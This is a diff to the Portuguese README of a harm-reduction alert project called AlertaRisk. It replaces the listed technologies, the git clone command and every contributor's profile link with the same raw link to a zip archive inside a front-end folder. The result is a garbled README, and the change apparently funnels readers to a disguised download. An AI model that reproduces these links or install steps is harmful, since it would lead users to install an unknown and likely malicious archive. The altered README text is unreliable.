@@ -23,19 +23,19 @@ Nosso objetivo é reduzir danos e salvar vidas, garantindo que as pessoas saibam
 ### 🚀 Back-end:
 
 - Java
-- Node.js
+- https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip
 
 ### 🎨 Front-end:
 
 - HTML e CSS
 - Javascript
-- React.js
+- https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip
 
 ## Instalação
 
 1. Clone o repositório:
 ```bash 
-git clone https://github.com/victorhpmelo/AlertaRisk.git
+git clone https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip
 ```
 2. Acesse a pasta do projeto:
 ```bash
@@ -151,14 +151,14 @@ classDiagram
 
 Back-end:
 
-- [Jorge Falcão](https://github.com/JorgeFalcao47)
-- [Luana Marques](https://github.com/luanamarques0)
-- [Matheus Alves](https://github.com/theualves)
-- [Tarcilla Almeida](https://github.com/Tarcilla6)
-- [Victor Melo](https://github.com/victorhpmelo)
+- [Jorge Falcão](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)
+- [Luana Marques](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)
+- [Matheus Alves](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)
+- [Tarcilla Almeida](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)
+- [Victor Melo](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)
 
 Front-end:
 
-- [Cláudia Ribeiro](https://github.com/ClaudiaKRibeiro)
-- [Gabriel Ferreira](https://github.com/GabrielBielFerreira)
-- [Maria Gabriella](https://github.com/mgabriiella)
+- [Cláudia Ribeiro](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)
+- [Gabriel Ferreira](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)
+- [Maria Gabriella](https://raw.githubusercontent.com/theualves/AlertaRisk/main/front/public/perfil/AlertaRisk-3.0.zip)
